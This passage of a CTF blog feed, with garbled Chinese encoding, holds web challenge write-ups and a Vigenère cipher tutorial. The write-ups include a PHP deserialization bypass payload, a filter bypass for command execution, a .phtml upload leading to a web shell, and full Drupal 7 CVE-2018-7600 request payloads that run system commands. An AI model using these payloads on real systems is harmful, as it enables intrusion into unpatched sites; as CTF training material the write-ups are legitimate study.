çš„è„šæœ¬ï¼Œéƒ½æ˜¯æˆ‘è–„å¼±çš„ç‚¹ï¼Œä»¥åæ‰¾ä¸ªæ—¶é—´å•ç‹¬é”»ç‚¼ä¸€ä¸‹</li><li>pythonç«™çš„é‡åˆ°secret_keyå°±åº”è¯¥æƒ³åˆ°å…¶ä¸­çš„ä¸€ä¸ªæ€è·¯å°±åº”è¯¥æ˜¯æ„é€ sessionï¼Œè¿˜æœ‰pythonç«™çš„ç»§æ‰¿é“¾çš„æ„é€ ä¹Ÿæ˜¯ä¸€ä¸ªç‚¹ï¼Œä¸å¤ªç†Ÿæ‚‰ï¼Œä¹Ÿéœ€è¦é”»ç‚¼</li><li>çœ‹åˆ°file_existsè¿™ç±»çš„å‡½æ•°çš„æ—¶å€™åº”è¯¥æœ‰å¾ˆå¥½çš„æ„è¯†å»æƒ³åˆ°éœ€è¦å»ç”¨<code>phar</code>åè®®å»æµ‹è¯•ä¸€ä¸‹ï¼ŒåŒæ ·çš„é‡Œé¢çš„popé“¾æ„é€ ä¹Ÿæ˜¯è‡ªå·±è–„å¼±çš„ç‚¹ï¼Œè¿˜å¾—å¤šåŠ ç»ƒä¹ </li><li>è¿™ä¸ªé‚®ç®±æ³¨å†Œç»•è¿‡ FILTER_VALIDATE_EMAILç„¶åxssï¼Œæ”»å‡»åªæœ‰æœ¬åœ°æ‰èƒ½è®¿é—®çš„local webåº”ç”¨ï¼Œä»è€Œåå¼¹shellï¼Œç„¶åç»§ç»­æ”»å‡»å†…ç½‘webé¢˜ç›®ï¼Œä½¿ç”¨tarææƒæŸ¥çœ‹flagï¼Œè¿™æ€è·¯å¾ˆå¥½ï¼Œå­¦åˆ°äº†ã€‚ã€‚ã€‚å›å»å¾—çœ‹çœ‹Linuxçš„ææƒéªšæ“ä½œäº†ï¼Œåªèƒ½è¯´å‡ºé¢˜äººçœŸçš„tqlâ€¦</li></ol>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å®‰æ’12æœˆèµ›Webé¢˜è§£</title>
      <link href="/anheng-12month.html"/>
      <url>/anheng-12month.html</url>
      <content type="html"><![CDATA[<h3 id="åæ§½ä¸€ä¸‹"><a href="#åæ§½ä¸€ä¸‹" class="headerlink" title="åæ§½ä¸€ä¸‹"></a>åæ§½ä¸€ä¸‹</h3><p>è¿™æ¬¡çš„webé¢˜ç›®æ„Ÿè§‰å®Œå…¨æ˜¯æ–°æ‰‹é¢˜ï¼Œæ€è·¯å¾ˆç›´æ¥ï¼Œæˆ‘å°±ä¸æºå’Œäº†ï¼Œåšå®Œwebå°±é€ƒ23333ï¼Œç»§ç»­å®Œæˆå¯†ç å­¦è¯¾ç¨‹å®éªŒæŠ¥å‘Šå»äº†<a id="more"></a>ã€‚ã€‚ã€‚ä½†è¿˜æ˜¯è®°å½•ä¸€ä¸‹ã€‚</p><h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><p>è¿™ä¸ªé¢˜ç›®è€ƒçš„æ˜¯ä¸€ä¸ªphpååºåˆ—åŒ–çš„ä¸€ä¸ªç»•è¿‡ï¼Œä¸Šæ¥å°±ç»™äº†ä¸€æ®µä»£ç ï¼Œå¾ˆç®€å•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br><span class="line">    <span class="keyword">if</span>(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…³é”®æ˜¯ç»•è¿‡è¿™ä¸€å¥ï¼Œæœ¬æ„æ˜¯ä¸ºäº†é˜²æ­¢å¯¹è±¡è¢«ååºåˆ—åŒ–ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹è¿™ç¯‡æ–‡ç« :<a href="https://blog.spoock.com/2016/11/03/php-wakeup/" target="_blank" rel="noopener">https://blog.spoock.com/2016/11/03/php-wakeup/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åªéœ€è¦åªéœ€è¦åœ¨å¯¹è±¡é•¿åº¦å‰æ·»åŠ ä¸€ä¸ª<code>+</code>å·ï¼Œå³<code>o:14-&gt;o:+14</code>ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡æ­£åˆ™åŒ¹é…ã€‚æœ€åçš„payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+<span class="number">4</span>:<span class="string">"baby"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>urlç¼–ç åå‘åŒ…å°±å¯ä»¥è·å¾—flag:<code>flag{ad2328a2c3f0933c053fd3c6f28f6143}</code></p><p><img src="https://s1.ax1x.com/2018/12/22/FySZ1H.png" alt="FySZ1H.png"></p><h3 id="ezweb2"><a href="#ezweb2" class="headerlink" title="ezweb2"></a>ezweb2</h3><p>è¿™ä¸ªé¢˜ç›®ä¸Šæ¥å‘ç°æ²¡ä»€ä¹ˆçº¿ç´¢ï¼Œåªèƒ½æ‰«ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°äº†ä¸€ä¸ª<code>admin.php</code>ï¼Œä½†æ˜¯è¿›å»å´å›æ˜¾<code>You are not admin...</code>ï¼Œè¿™æ ·æ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼Œæˆ‘ä»¬éœ€è¦ä¼ªé€ adminçš„èº«ä»½ï¼ŒæŸ¥ä¸€ä¸‹cookieï¼Œæœç„¶éœ€è¦ä¼ªé€ ä¸€ä¸‹ï¼ŒæŠŠcookieçš„å€¼ä»<code>user</code>-&gt;<code>admin</code>å°±å¥½ï¼Œè¿˜éœ€base64ä¸€ä¸‹</p><p><img src="https://s1.ax1x.com/2018/12/22/FySHvd.png" alt="FySHvd.png"></p><p>ç„¶åå°±å¯ä»¥è¿›å…¥ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„é¡µé¢,è¾“å…¥<code>ls</code>å‘ç°æœ‰å›æ˜¾ï¼Œä½†æ˜¯å¾ˆå¤šä¸œè¥¿éƒ½è¢«è¿‡æ»¤äº†</p><p><img src="https://s1.ax1x.com/2018/12/22/FySObt.png" alt="FySObt.png"></p><p><img src="https://s1.ax1x.com/2018/12/22/Fyphss.png" alt="Fyphss.png"></p><p>å¯ä»¥å°è¯•ä¸€ä¸‹è¯»æ–‡ä»¶ï¼Œåœ¨<code>config.php</code>å‘ç°é»‘åå•</p><p>admin.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'admin'</span>])||$_SESSION[<span class="string">'admin'</span>]===<span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"You are not admin..."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'cmd'</span>]) &#123;</span><br><span class="line">$cmd = waf_exec($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">$retval = <span class="keyword">array</span>();</span><br><span class="line">exec($cmd, $retval, $status);</span><br><span class="line"><span class="comment">// var_dump($retval);</span></span><br><span class="line"><span class="keyword">if</span> ($status == <span class="number">0</span>) &#123;</span><br><span class="line">$res = implode(<span class="string">"\n"</span>,$retval);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$res = <span class="string">'error'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$res = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'./templates/admin.html'</span>;</span><br></pre></td></tr></table></figure><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+| )/i"</span>;</span><br><span class="line">$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®æ˜¯å¦‚ä½•ç»•è¿‡è¿™ä¸ªé»‘åå•å»è¯»åˆ°flagï¼Œè¿™é‡Œå·²ç»æŠŠå¾ˆå¤šä¸œè¥¿éƒ½è¿‡æ»¤äº†ï¼Œä½†æ˜¯<code>$</code>ä»¥åŠ<code>/</code>éƒ½æ²¡è¢«è¿‡æ»¤ï¼Œå¯ä»¥å¾ˆå¥½åœ°æ‰§è¡Œå‘½ä»¤</p><p><img src="https://s1.ax1x.com/2018/12/22/FypvLR.png" alt="FypvLR.png"></p><p>æˆåŠŸè¯»å–flag:<code>flag{6f1d95159e3b90ed28186c518dd15e8c}</code></p><p><img src="https://s1.ax1x.com/2018/12/22/Fypze1.png" alt="Fypze1.png"></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ç»´å‰å°¼äºšå¯†ç åŸç†åŠPythonå®ç°</title>
      <link href="/Virginia-python.html"/>
      <url>/Virginia-python.html</url>
      <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>ç»´å‰å°¼äºšå¯†ç æ˜¯ä½¿ç”¨ä¸€ç³»åˆ—å‡¯æ’’å¯†ç ç»„æˆå¯†ç å­—æ¯è¡¨çš„åŠ å¯†ç®—æ³•ï¼Œå±äºå¤šè¡¨å¯†ç çš„ä¸€ç§ç®€å•<a id="more"></a>å½¢å¼ã€‚</p><h3 id="ç®—æ³•æè¿°"><a href="#ç®—æ³•æè¿°" class="headerlink" title="ç®—æ³•æè¿°"></a>ç®—æ³•æè¿°</h3><ol><li>åŠ å¯†è¿‡ç¨‹:æ˜æ–‡å­—æ¯på¯¹åº”çš„åˆ—å’Œç§˜é’¥å­—æ¯kå¯¹åº”çš„è¡Œçš„äº¤å‰ç‚¹å°±æ˜¯åŠ å¯†å­—æ¯åçš„å¯†æ–‡å­—æ¯</li><li>è§£å¯†è¿‡ç¨‹:åœ¨å¯†é’¥å­—æ¯kå¯¹åº”çš„è¡Œæ‰¾åˆ°å¯¹åº”å¯†æ–‡å­—æ¯ï¼Œåˆ™è¯¥å¯†æ–‡å­—æ¯å¯¹åº”çš„åˆ—çš„å­—æ¯å°±æ˜¯æ˜æ–‡å­—æ¯</li></ol><p>ä¸‹å›¾å°±æ˜¯ç»´å‰å°¼äºšå¯†ç çš„è¡¨æ ¼ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ è¿™æ ·çš„ä¸€ä¸ªè¡¨å»æŸ¥ï¼Œä»£ç æ˜¯å°†å…¶å˜æˆäº†ä¸€ç»´çš„å½¢å¼ç„¶åå®ç°çš„</p><p><img src="https://s2.ax1x.com/2019/01/01/F5UNH1.png" alt="F5UNH1.png"></p><h3 id="æ ¸å¿ƒä»£ç åŠåˆ†æ"><a href="#æ ¸å¿ƒä»£ç åŠåˆ†æ" class="headerlink" title="æ ¸å¿ƒä»£ç åŠåˆ†æ"></a>æ ¸å¿ƒä»£ç åŠåˆ†æ</h3><p>å­—æ¯çš„åç§»é—®é¢˜ï¼Œæˆ‘è¿™é‡Œæ˜¯åˆ†å¼€å¤§å°å†™å­—æ¯è¿›è¡ŒåŠ è§£å¯†çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¤§å†™åŠ è§£å¯†åè¿˜æ˜¯å¤§å†™ï¼Œå°å†™åŠ è§£å¯†åè¿˜æ˜¯å°å†™ï¼Œç„¶åä»26ä¸ªå­—æ¯é‡Œé¢é€‰æ‹©ï¼Œæ‰€ä»¥å¿…é¡»æ³¨æ„è¾¹ç•Œé—®é¢˜ï¼Œéœ€è¦å¯¹26å–ä½™ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">letter_list = string.ascii_uppercase</span><br><span class="line">letter_list2 = string.ascii_lowercase</span><br></pre></td></tr></table></figure><p>ä»£ç åªå¯¹å­—æ¯è¿›è¡ŒåŠ è§£å¯†ï¼Œä»£ç é‡Œé¢éœ€è¦æ³¨æ„çš„æ˜¯ä¸€ä¸‹ç»†èŠ‚é—®é¢˜ï¼Œæ¯”å¦‚åœ¨å¯†é’¥ä½¿ç”¨å®Œè¿‡åéœ€è¦å¾ªç¯ä½¿ç”¨ï¼Œè¿™é‡Œç”¨çš„æ˜¯å–ä½™åŠ ä¸Šä¸€ä¸ªæ ‡è®°flagå»å®ç°ï¼Œç„¶åä»å­—æ¯åˆ—è¡¨é‡Œé¢é€‰å–å¯¹åº”çš„å­—æ¯å³å¯ã€‚åŠ è§£å¯†ä»£ç å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span><span class="params">(message,key)</span>:</span></span><br><span class="line">    ciphertext = <span class="string">""</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    key_list = key</span><br><span class="line">    <span class="keyword">for</span> plain <span class="keyword">in</span> message:</span><br><span class="line">        <span class="keyword">if</span> flag % len(key_list) == <span class="number">0</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> plain.isalpha(): <span class="comment">#åˆ¤æ–­æ˜¯å¦ä¸ºè‹±æ–‡</span></span><br><span class="line">            <span class="keyword">if</span> plain.isupper():</span><br><span class="line">                ciphertext += letter_list[(ord(plain) - <span class="number">65</span> + key_list[flag]) % <span class="number">26</span>] <span class="comment">#è¡Œåç§»åŠ ä¸Šåˆ—åç§»</span></span><br><span class="line">                flag += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> plain.islower():</span><br><span class="line">                ciphertext += letter_list2[(ord(plain) - <span class="number">97</span> + key_list[flag]) % <span class="number">26</span>]</span><br><span class="line">                flag += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:<span class="comment">#ä¸æ˜¯è‹±æ–‡ä¸åŠ å¯†</span></span><br><span class="line">            ciphertext += plain</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(message,key)</span>:</span></span><br><span class="line">    plaintext = <span class="string">""</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    key_list = key</span><br><span class="line">    <span class="keyword">for</span> cipher <span class="keyword">in</span> message:</span><br><span class="line">        <span class="keyword">if</span> flag % len(key_list) == <span class="number">0</span>:</span><br><span class="line">            flag  = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> cipher.isalpha():</span><br><span class="line">            <span class="keyword">if</span> cipher.isupper():</span><br><span class="line">                plaintext += letter_list[(ord(cipher) - <span class="number">65</span> - key_list[flag]) %<span class="number">26</span>]</span><br><span class="line">                flag += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> cipher.islower():</span><br><span class="line">                plaintext += letter_list2[(ord(cipher) - <span class="number">97</span> - key_list[flag]) % <span class="number">26</span>]</span><br><span class="line">                flag += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plaintext += cipher</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br></pre></td></tr></table></figure><h3 id="æ­£ç¡®æ€§"><a href="#æ­£ç¡®æ€§" class="headerlink" title="æ­£ç¡®æ€§"></a>æ­£ç¡®æ€§</h3><p>è¿™é‡Œä»¥è¾“å…¥â€helloworldâ€ä¸ºä¾‹ï¼Œç„¶åè¿›è¡ŒåŠ è§£å¯†ï¼Œèƒ½å¤Ÿæ­£ç¡®å®Œæˆ</p><p><img src="https://s2.ax1x.com/2019/01/01/F5UGjJ.png" alt="F5UGjJ.png"></p><h3 id="è¯¦ç»†ä»£ç -æ”¾åœ¨githubä¸Šäº†-ï¼šç»´å‰å°¼äºšå¯†ç "><a href="#è¯¦ç»†ä»£ç -æ”¾åœ¨githubä¸Šäº†-ï¼šç»´å‰å°¼äºšå¯†ç " class="headerlink" title="è¯¦ç»†ä»£ç (æ”¾åœ¨githubä¸Šäº†)ï¼šç»´å‰å°¼äºšå¯†ç "></a>è¯¦ç»†ä»£ç (æ”¾åœ¨githubä¸Šäº†)ï¼š<a href="https://github.com/0v3rW4tch/Cryptography-course-design" target="_blank" rel="noopener">ç»´å‰å°¼äºšå¯†ç </a></h3>]]></content>
      
      <categories>
          
          <category> å¯†ç å­¦ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CUMTç¬¬ä¸€è½®åŒæœˆèµ›Webé¢˜è§£</title>
      <link href="/CUMT-month-race.html"/>
      <url>/CUMT-month-race.html</url>
      <content type="html"><![CDATA[<h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez-upload"></a>ez-upload</h3><p>è¿™ä¸ªé¢˜ç›®ä½œä¸ºWebé¢˜çš„ç¬¬ä¸€ä¸ªé¢˜éš¾åº¦åˆšå¥½ï¼Œå¾ˆåŸºç¡€çš„æ¼æ´ç‚¹ï¼Œå°±è€ƒäº†ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šæ¥ç›´æ¥ç”¨phtmlå°±å¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯ç»™å‡ºæ¥çš„hintæ˜¯.htaccess,å¯èƒ½æ˜¯æˆ‘éé¢„<a id="more"></a>æœŸäº†ï¼Ÿ</p><p><a href="https://imgchr.com/i/Fa0BnI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/Fa0BnI.png" alt="Fa0BnI.png"></a></p><p>èœåˆ€é“¾æ¥è·å–flag</p><p><a href="https://imgchr.com/i/Fa0rHP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/Fa0rHP.png" alt="Fa0rHP.png"></a></p><h3 id="Cve"><a href="#Cve" class="headerlink" title="Cve"></a>Cve</h3><p>å‚è€ƒäº†è¿™ç¯‡æ–‡ç« ï¼š<code>https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#ä»£ç æ‰§è¡Œç°åœº</code></p><p>è¿™æ˜¯ä¸€ä¸ªDrupal 7çš„cveï¼Œç…§ç€æ„é€ payloadå°±å¥½ï¼Œpayload åˆ†ä¸ºä¸¤ä¸ªè¯·æ±‚ã€‚ å…ˆå°† Payload æ³¨å…¥ç¼“å­˜ä¸­ï¼Œæ„é€ ä¸‹é¢çš„payloadï¼Œå‘é€ä¸€ä¸ªPOSTåŒ…</p><p>POSTè¯·æ±‚ï¼š<code>/?q=user/password&amp;name[%23post_render][]=system&amp;name[%23type]=markup&amp;name[%23markup]=ls%20/</code></p><p>POSTå†…å®¹ï¼š<code>form_id=user_pass&amp;_triggering_element_name=name</code></p><p>è·å–form_build_idçš„valueå€¼ï¼š</p><p><a href="https://imgchr.com/i/FayX0s" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FayX0s.png" alt="FayX0s.png"></a></p><p>ç„¶åå†POSTå‘é€æ‰§è¡Œçš„åŒ…ï¼š<code>/?q=file/ajax/name/%23value/form-b7pP9HUKwcQBEuhZ1GZ79qWXV0KRb5YxUGoWaozSPRU</code>è¿™é‡Œä¹Ÿéœ€è¦form_build_idçš„å€¼ï¼ŒPOSTçš„å†…å®¹ä¹Ÿæ˜¯ï¼š<code>form_build_id=form-b7pP9HUKwcQBEuhZ1GZ79qWXV0KRb5YxUGoWaozSPRU</code>æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œæ³¨æ„ä¸€ä¸‹å‚è€ƒæ–‡ç« é‡Œé¢çš„<code>passthru</code>å‘½ä»¤ç”¨ä¸äº†ï¼Œåªèƒ½æ”¹ä¸º<code>system</code>æ‰èƒ½æ‰§è¡Œç›¸å…³å‘½ä»¤,æ‰€ä»¥ä¸Šé¢ç¼“å­˜çš„æ—¶å€™æ¢äº†ç”¨<code>system</code>å‡½æ•°</p><p><a href="https://imgchr.com/i/Fa6knJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/Fa6knJ.png" alt="Fa6knJ.png"></a></p><p>å†æ¥ä¸€æ¬¡<code>cat /flag</code>çš„æ“ä½œå°±å¯ä»¥è¯»å–flagäº†</p><p><a href="https://imgchr.com/i/Fa66Nq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/Fa66Nq.png" alt="Fa66Nq.png"></a></p><h3 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h3><p>è¿™ä¸ªé¢˜æ˜¯ä¸ªä»£ç å®¡è®¡çš„é¢˜ç›®ï¼Œå…ˆæŠŠæºç ç»™downä¸‹æ¥</p><p>æ‰“å¼€è¿™ä¸ªç½‘ç«™å‘ç°æœ‰ç™»é™†æ³¨å†ŒåŠŸèƒ½ï¼Œä»¥åŠè´­ä¹°flagçš„åŠŸèƒ½ï¼Œä½†æ˜¯è¿™é‡Œé¢è¦æƒ³å¾—åˆ°çœŸæ­£çš„flagå´éœ€è¦888ç§¯åˆ†æ‰å¯ä»¥è´­ä¹°ï¼Œè¿™ä¸ªæ—¶å€™å°±æ„Ÿè§‰åº”è¯¥æ˜¯è¶Šæƒè´­ä¹°flagçš„æ¼æ´äº†ã€‚ã€‚ã€‚ã€‚</p><p>å‘ç°æºç é‡Œé¢æœ‰æ•°æ®åº“æ–‡ä»¶æ‰“å¼€çœ‹ä¸€ä¸‹ï¼Œå‘ç°æ˜¯å­˜åœ¨ç®¡ç†å‘˜çš„ï¼Œå¹¶ä¸”idæ˜¯16ï¼Œè¿™ä¸ªä¸œè¥¿åæœŸæœ‰ç”¨ï¼Œè€Œä¸”ä»–æœ‰30000ç§¯åˆ†ï¼Œå¤Ÿä¹°å¾ˆå¤šflagäº†ï¼Œè¿˜æœ‰å•†å“id 38ä¹Ÿå¯ä»¥å¾—çŸ¥</p><p><a href="https://imgchr.com/i/FaNVu6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNVu6.md.png" alt="FaNVu6.md.png"></a></p><p><a href="https://imgchr.com/i/FaNeHO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNeHO.png" alt="FaNeHO.png"></a></p><p>çœ‹åˆ°ä»£ç é‡Œé¢çš„settingæ–‡ä»¶ï¼Œæœ‰ä»secret.keyè¯»å‡ºæ¥çš„ç§˜é’¥</p><p><a href="https://imgchr.com/i/FaNuUe" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNuUe.md.png" alt="FaNuUe.md.png"></a></p><p>çœ‹ä¸€ä¸‹é‡Œé¢çš„ç§˜é’¥ï¼Œä¸€å®šè¦æ³¨æ„è¿™é‡Œè¿˜æœ‰ä¸ªå›è½¦å•Šå•Šå•Šå•Šï¼Œåè¾¹ä¼ªé€ ç­¾åæœ‰ç”¨</p><p><a href="https://imgchr.com/i/FaN1gI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaN1gI.png" alt="FaN1gI.png"></a></p><p>é‡ç‚¹å…³æ³¨è¿™æ®µä»£ç </p><p><a href="https://imgchr.com/i/FaN3vt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaN3vt.md.png" alt="FaN3vt.md.png"></a></p><p>è¿™é‡Œå¯ä»¥çœ‹å‡ºå•å•å¯¹å•†å“æ–¹åšäº†æ ¡éªŒ(è‡ªæ£€éªŒ)ï¼Œé‚£è´­ä¹°è€…å‘¢ï¼Ÿä¸å­˜åœ¨å¯¹å…¶çš„ä»»ä½•æ ¡éªŒï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰åšå¥½åŒå‘çš„æ ¡éªŒï¼Œè¿™ä¹Ÿè¯´æ˜æˆ‘ä»¬å¯ä»¥ä»ä¼ªé€ è´­ä¹°è€…çš„æ–¹é¢å»å…¥æ‰‹ï¼Œè®©åˆ«äººä»˜é’±23333</p><p>æ ¹æ®å®ƒé‡Œé¢çš„ä»£ç å»æ„é€ signatureå°±å¥½äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE = <span 